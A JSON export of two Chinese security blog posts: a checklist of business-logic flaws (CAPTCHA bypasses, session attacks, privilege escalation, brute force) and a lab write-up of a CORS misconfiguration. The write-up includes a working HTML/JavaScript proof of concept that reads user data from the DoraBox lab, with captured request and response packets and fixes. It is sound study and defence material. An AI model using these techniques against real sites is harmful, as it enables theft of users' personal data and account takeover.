[{"content":"什么是逻辑漏洞 逻辑漏洞通常所做的不是针对一个程序进行破坏，而是利用程序设计的缺陷，获取并非属于自己的资源和数据。在程序内通常会出现在：账户、交易、验证码、Session、越权访问等相关功能点；这类漏洞通常是企业所重视的。\n交易 购买 业务风控 账户 注册 密码 邮箱用户名 Cookie 手机号用户名 登录 暴力破解 登录处未设置验证码 未限制用户名在一定时间内登录上限次数 未根据请求地址限制登录上限次数 未严格限制时，可以通过密码字典撞库攻击。\ntips：数据包传输时尽量不要使用简单的base64加密或者md5加密，使用burpsuite暴力破解时可以对字典的关键字段进行简单的加密。\n找回密码 修改密码 申诉 信息查询 越权查询\n遍历参数查询\n2FA 验证码 验证码可重用 验证码可预测 验证码强度不够 验证码无时间限制或者失效时间长 验证码无猜测次数限制 验证码传递特殊的参数或不传递参数绕过 验证码可从返回包中直接获取 验证码不刷新或无效 验证码数量有限 验证码在数据包中返回 修改Cookie绕过 修改返回包绕过 验证码在客户端生成或校验 验证码可OCR或使用机器学习识别 验证码用于手机短信/邮箱轰炸\nSession Session机制 Session猜测 / 爆破 Session伪造 Session泄漏 Session Fixation\n越权 未授权访问\n静态文件 通过特定url来防止被访问 水平越权\n攻击者可以访问与他拥有相同权限的用户的资源\n权限类型不变，ID改变\n其他 用户/订单/优惠券等ID生成有规律，可枚举 接口无权限、次数限制 加密算法实现误用 执行顺序 敏感信息泄露 随机数安全 使用不安全的随机数发生器 使用时间等易猜解的因素作为随机数种子\n修复方案 信息泄露会使攻击者获得有价值的系统相关信息。 因此，应始终考虑到您正在泄露何种信息以及恶意用户是否可能使用这些信息。\n参考链接 https://websec.readthedocs.io/zh/latest/vuln/logic.html\n","date":"2022-08-11T03:34:55+08:00","image":"https://img-blog.csdnimg.cn/226e18cf216b4d3795cabaf1bc17ed3c.png","permalink":"https://kylin.moe/p/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/","title":"业务逻辑漏洞挖掘"},{"content":"在 xray 被动扫描的时候无意间看到了 baseline/cors/reflected，因为是未接触过的东西 简单总结一下，虽然到了最后换来了个 风险过低已忽略就是了\n什么是CORS 首先明白几个概念 Origin（源）、SOP（同源策略） 和 CROS（跨域资源访问） 分别是什么\nOrigin\n三个要素构成了Origin，分别是\n访问 Web 内容时的协议（http://） 域名（example.com） 端口（:80） 三者统称为源 Origin详解\nSOP\n同源策略（Same Origin Policy），同源策略是基于浏览器的安全策略，它限制了网站之间不能随意互相读取和访问对方的资源。只有请求源（本地）和目标源（服务器）相同时，才能对相应资源进行读取。 同源策略详解\nCORS\n跨域资源共享（Cross-Origin Resource Sharing）随着发展，业务不满足于内部的资源访问，于是便有了CORS（跨域资源共享）机制，开发者可以配置具体允许哪些源对服务器的资源进行访问，但是如果未进行配置，用户只要在请求标头 Origin 字段中加入允许访问的地址，那么就可以构建任意的可允许访问的源（Access-Control-Allow-Origin）\n通常 Access-Control-Allow-Origin 字段会在服务器的响应数据包内 请求标头Origin详解\n同源与不同源的例子\n假设服务器地址为 http://example.com\n几个同源的例子\n1 2 3 http://example.com http://example.com/1.php http://example.com/2.php 不同源的例子\n1 2 3 http://example.com https://example.com http://example.com:8080 漏洞是如何产生的\n上文提到了 请求标头 Origin 是可以构建的，假设服务器没有对字段做严格的限制，那么我们可以构造任意字段，让服务器的资源可提供给任意的第三方服务器。\n那么服务器同时满足下面三点要求，则可能构成CORS漏洞\n1 2 3 开启了 CORS（跨域资源共享） 未对Origin（请求标头）的内容做限制 未限制 Access-Control-Allow-Origin（允许访问的源） 字段 靶场复现 这里使用 DoraBox靶场: https://github.com/0verSp4ce/DoraBox\n本地搭建环境，访问 URL http://localhost/DoraBox/csrf/userinfo.php\n拦截数据包分析响应包内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 05 Aug 2022 20:35:19 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.6 Access-Control-Allow-Origin: * Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS Content-Length: 151 {\u0026#34;username\u0026#34;:\u0026#34;Vulkey_Chen\u0026#34;,\u0026#34;mobilephone\u0026#34;:\u0026#34;13188888888\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@gh0st.cn\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd\u0026#34;,\u0026#34;sex\u0026#34;:\u0026#34;Cool Man\u0026#34;} Access-Control-Allow-Origin:* 允许所有域都具有访问资源的权限。\nAccess-Control-Allow-Credentials: true 允许将请求的响应内容暴露给前端的JavaScript代码\nAccess-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS 允许跨域访问资源的请求方式\n服务端响应包内声明了，1. 任何域都可以访问资源 2. 允许将相应内容通过 JavasScript 代码获取 3. 允许多种方式，如PUT,POST,GET 方式请求服务器资源，那我们我们可以构建 POC 请求服务器资源\n这里的 POC 在靶场 DoraBox/PoC/csrf/CORS/index.html 目录内有现成的，直接套用\n在本地构建 report.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;cors exp\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { alert(this.responseText); document.getElementById(\u0026#34;demo\u0026#34;).innerHTML = this.responseText; } }; xhttp.open(\u0026#34;GET\u0026#34;, \u0026#34;http://localhost/DoraBox/csrf/userinfo.php\u0026#34;); xhttp.withCredentials = true; xhttp.send(); } cors(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; report.html 通过 javascript 代码请求服务器资源，并且服务器返回了响应的资源，在存在 CORS 漏洞的前提下，可以通过 CORS 来访问服务器未授权的接口、或是一些用户的敏感信息。\n使用浏览器打开页面 report.html\n请求包\n1 2 3 4 5 6 7 8 9 10 11 GET /DoraBox/csrf/userinfo.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Origin: null Connection: close Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: cross-site 响应包\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 05 Aug 2022 20:43:19 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.6 Access-Control-Allow-Origin: null Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS Content-Length: 151 {\u0026#34;username\u0026#34;:\u0026#34;Vulkey_Chen\u0026#34;,\u0026#34;mobilephone\u0026#34;:\u0026#34;13188888888\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@gh0st.cn\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd\u0026#34;,\u0026#34;sex\u0026#34;:\u0026#34;Cool Man\u0026#34;} 梳理一下整个流程，此时存在 网站A 和网站B，以及用户A。网站A是业务站点，网站B是我们搭建的恶意请求资源站点。\n用户A在网站A登录了自己的账号，网站A返回了相应的用户信息 用户A访问了网站B，网站B通过用户A向网站A发起请求，此时网站A返回相应内容，因为没有对跨域资源访问做限制，网站B也能获取到网站A的响应内容 因为未对跨域请求做限制而导致第三方站点可以请求服务器资源，并不是绝对存在安全隐患的。假如说一个设计用户隐私的页面，页面会返回敏感信息的时候，这时候假设用户访问了恶意站点，恶意站点又针对敏感信息做了资源请求，可能就会导致用户的信息泄露。\n针对CORS漏洞的挖掘有一些小 tips，也简单的提一下\n利用burpsuite，设置访问头带Origin请求，过滤响应包的内容\nBurpSuite 配置 Proxy - Options - Match and Replace 勾选 Request header Origin: foo.example.org\n历史数据包中过滤规则包含 Access-Control-Allow-Origin: foo.example.org 也就是筛选允许跨域资源请求的站点，针对这些站点返回的信息，单个的进行手工检测。\n修复方案 严格限制 Origin 字段的内容 配置 Access-Control-Allow-Origin 可访问的源 避免 Access-Control-Allow-Origin: null 信任形式建议配置为 *.example.com 或 .example.com 减少 Access-Control-Allow-Methods 允许的请求方式 参考文献 CORS跨域漏洞学习 - Lushun CORS跨域漏洞的学习 - FreeBuf网络安全行业门户 CORS - 术语表 | MDN (mozilla.org) 文章是自己整理出来的，因为是一个新的知识点，设计到的东西太多了，不可能没有任何瑕疵和纰漏，希望能帮到你。如果有任何疑问，欢迎给我留言。\n","date":"2022-08-10T17:16:45+08:00","image":"https://img-blog.csdnimg.cn/img_convert/a09ad76b3dfb19364fa79f034b0f2d85.png","permalink":"https://kylin.moe/p/cors%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E/","title":"CORS跨域资源共享漏洞"}]